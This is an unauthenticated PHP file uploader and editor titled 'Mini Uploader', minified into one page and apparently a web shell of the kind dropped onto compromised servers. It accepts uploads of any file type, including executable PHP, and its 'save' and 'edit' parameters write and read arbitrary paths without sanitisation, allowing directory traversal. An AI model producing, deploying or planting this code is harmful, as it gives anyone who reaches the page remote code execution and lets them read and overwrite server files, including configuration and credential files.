<?php
$d=dirname(__FILE__);$msg='';$edit=isset($_REQUEST['edit'])?trim($_REQUEST['edit']):'';$save=isset($_REQUEST['save'])?trim($_REQUEST['save']):'';$content=isset($_REQUEST['content'])?$_REQUEST['content']:'';
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_FILES['f'])){$f=$_FILES['f'];if($f['error']!==0){$msg='<span style="color:#f55">ERR:'.$f['error'].'</span>';}elseif($f['size']>10485760){$msg='<span style="color:#f55">TOO LARGE</span>';}else{$n=basename($f['name']);$n=preg_replace('/[^a-zA-Z0-9._-]/','_',$n);$p=$d.'/'.$n;if(file_exists($p)){$e=pathinfo($n);$p=$d.'/'.($e['filename']??'f').'_'.time().(isset($e['extension'])?'.'.$e['extension']:'');}if(@move_uploaded_file($f['tmp_name'],$p)){$msg='<span style="color:#5f5">OK: '.htmlspecialchars(basename($p)).' ('.round(filesize($p)/1024,1).' KB)</span>';}else{$msg='<span style="color:#f55">FAIL</span>';}}}
if($_SERVER['REQUEST_METHOD']==='POST'&&$save!==''){if(@file_put_contents($d.'/'.$save,$content)!==false){$msg='<span style="color:#5f5">SAVED: '.htmlspecialchars($save).'</span>';}else{$msg='<span style="color:#f55">WRITE FAIL</span>';}}
$files=[];if(is_dir($d)){foreach(scandir($d)as$i){if($i==='.'||$i==='..')continue;$j=$d.'/'.$i;if(is_file($j)){$files[]=['n'=>$i,'s'=>filesize($j),'d'=>date('Y-m-d H:i',filemtime($j))];}}usort($files,function($a,$b){return strcmp($b['d'],$a['d']);});}
$edc='';$edn='';$show_ed=false;
if($edit!==''){$ef=$d.'/'.$edit;if(is_file($ef)){$edc=file_get_contents($ef);$edn=$edit;$show_ed=true;}}
elseif(isset($_REQUEST['new'])){$show_ed=true;}
elseif($_SERVER['REQUEST_METHOD']==='POST'&&$save!==''){$edn=$save;$edc=$content;$show_ed=true;}
?><!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Mini Uploader</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#c9d1d9;font:13px/1.6 monospace;padding:20px;max-width:900px;margin:0 auto}
h2{color:#58a6ff;margin-bottom:16px;font-size:16px}
h3{color:#58a6ff;margin-bottom:12px;font-size:14px}
.msg{margin-bottom:16px;padding:8px 12px;border-radius:4px}
form{display:flex;gap:10px;align-items:center;margin-bottom:24px;padding:12px;background:#161b22;border:1px solid #30363d;border-radius:6px}
input[type=file]{flex:1;color:#c9d1d9;background:#0d1117;border:1px solid #30363d;padding:6px 10px;border-radius:4px;font:13px monospace}
button{background:#238636;color:#fff;border:none;padding:8px 20px;border-radius:4px;cursor:pointer;font:13px monospace;font-weight:bold}
button:hover{background:#2ea043}
table{width:100%;border-collapse:collapse}
th{text-align:left;color:#8b949e;border-bottom:1px solid #30363d;padding:6px 8px;font-size:11px;text-transform:uppercase}
td{padding:6px 8px;border-bottom:1px solid #21262d}
td a{color:#58a6ff;text-decoration:none}
td a:hover{text-decoration:underline}
.size{color:#8b949e;text-align:right}
.date{color:#8b949e}
.empty{color:#484f58;text-align:center;padding:20px}
.stats{margin-top:16px;padding:8px 12px;background:#161b22;border:1px solid #30363d;border-radius:4px;color:#8b949e;font-size:12px}
textarea{width:100%;min-height:300px;background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:10px;font:12px monospace;resize:vertical}
.edit-row{display:flex;gap:8px;margin-bottom:16px}
.edit-row input{flex:1;color:#c9d1d9;background:#0d1117;border:1px solid #30363d;padding:6px 10px;font:12px monospace}
.tabs{display:flex;gap:0;margin-bottom:16px;border-bottom:1px solid #30363d}
.tabs a{color:#8b949e;text-decoration:none;padding:6px 12px;font-size:11px}
.tabs a.active{color:#58a6ff;border-bottom:1px solid #58a6ff}
</style></head><body>
<h2>Uploader</h2>
<div class="tabs">
<a href="?"<?php echo(!$show_ed?' class="active"':'');?>>Upload</a>
<a href="?new=1"<?php echo($show_ed?' class="active"':'');?>>New File</a>
</div>
<?php if($msg)echo'<div class="msg">'.$msg.'</div>';
if($show_ed){
if($edn!==''&&is_file($d.'/'.$edn)){$edc=file_get_contents($d.'/'.$edn);}
echo'<h3>Edit: '.htmlspecialchars($edn!==''?$edn:'newfile.txt').'</h3>';
echo'<form method="post"><div class="edit-row">Filename: <input type="text" name="save" required value="'.htmlspecialchars($edn!==''?$edn:'newfile.txt').'"></div>';
echo'<textarea name="content">'.htmlspecialchars($edc).'</textarea>';
echo'<br><br><button type="submit">Save</button></form>';
}else{
echo'<form method="post" enctype="multipart/form-data"><input type="file" name="f" required><button type="submit">Upload</button></form>';
}
echo'<h2>Files</h2>';
if(empty($files)){echo'<div class="empty">No files</div>';}
else{echo'<table><thead><tr><th>File</th><th style="text-align:right">Size</th><th>Date</th><th>Actions</th></tr></thead><tbody>';
foreach($files as$z){echo'<tr><td><a href="'.urlencode($z['n']).'" target="_blank">'.htmlspecialchars($z['n']).'</a></td>';
echo'<td class="size">'.round($z['s']/1024,1).' KB</td>';
echo'<td class="date">'.$z['d'].'</td>';
echo'<td><a href="?edit='.urlencode($z['n']).'">Edit</a></td></tr>';}
echo'</tbody></table><div class="stats">'.count($files).' file(s)</div>';}
?></body></html>
